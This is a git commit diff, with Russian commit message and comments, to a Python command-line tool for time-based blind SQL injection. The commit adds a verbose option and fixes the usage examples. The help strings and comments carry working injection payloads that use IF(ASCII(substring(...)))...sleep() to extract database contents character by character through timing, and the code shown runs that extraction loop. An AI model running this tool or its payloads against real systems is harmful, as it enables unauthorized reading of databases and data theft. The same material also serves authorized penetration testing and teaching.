357025a61495eb1fe6223db4918eb5b7c3a52a08
mikop63 <mikop63@gmail.com>
2023-06-15 11:17:49 +0400

    Добавил подробный вывод

--- main.py
+++ main.py
@@ -10,9 +10,10 @@ parser.add_argument('-post',
                     help='HTTP POST method. Example: python3 blind_sql.py -post -u "http://example.com:1337" -d "name=value\' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #" ',
                     action="store_true")
 parser.add_argument('-u', '--URL', type=str, help='Enter URL Example: --URL "http://192.168.0.1/"', )
+parser.add_argument('-t', '--Type', type=str, help='Type strings Example: -t HEX', )
+parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode. Example: blind_sql.py -get -u "http://example.com:1337?id=1 -v ', )
 parser.add_argument('-d', '--Data' , action='append', nargs='+',
                     help='Data string to be sent through POST in format kay=value (e.g. -d "id=1337" "name=value\' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #" )')
-parser.add_argument('-t', '--Type', type=str, help='Type strings Example: -t HEX', )
 parser.add_argument('-H', '--Header', action='append', nargs='+',
                     help='Headers for a POST request (e.g. "-H "Content-Type: application/json" -H "Authorization: Bearer token {SYMBOL}" ")')
 args = parser.parse_args()
@@ -28,7 +29,8 @@ def blind_sql(length_result, delay_time):
     print('Print result:')
 
     while (i <= length_result):  # Цикл while будет выполняться пока не дойдем до конца возможной длинны
-        # print('i:', i)
+        if args.verbose:
+            print('i:', i)
         for char in dictionary:  # Цикл for по нашему словарю dictionary
             start_time = timer()  # Начальное время
             if args.get == True:
@@ -59,8 +61,9 @@ def blind_sql(length_result, delay_time):
                 # функция format подставляет значения из i и char в запрос вместо {}
             end_time = timer()  # Конечное время
             time = end_time - start_time  # Затраченное время
-            print(chr(char),
-                  time)  # просмотр всех результатов для определения подходящего времени переменной time для вывода релевантных результатов
+            if args.verbose:
+                print(chr(char),
+                    time)  # просмотр всех результатов для определения подходящего времени переменной time для вывода релевантных результатов
             if time > delay_time:  # вывод только релевантных результатов
                 # print(chr(char), end='\n', flush=True)
                 print(chr(char), end='', flush=True)
@@ -84,10 +87,10 @@ if __name__ == "__main__":
 
     blind_sql(length_result, delay_time)
 
-# python3 main.py -post -u "http://192.168.0.1/" -type HEX -H "Content-Type: application/json" -H "Authorization: Bearer token"
+# python3 main.py -post -u "http://192.168.0.1/" -t HEX -H "Content-Type: application/json" -H "Authorization: Bearer token"
 
 # парсим -d
-# python3 main.py -post -u "http://192.168.0.1/" -type HEX -d "id=1337" -d "name=value' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #"
+# python3 main.py -post -u "http://192.168.0.1/" -t HEX -d "id=1337" -d "name=value' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #"
 
 
 # python3 main.py -post -u "http://192.168.0.1/" --Type HEX -d "id=1337" --Data "name=value" -H "Content-Type: application/json" -H "Authorization: Bearer token {SYMBOL}"
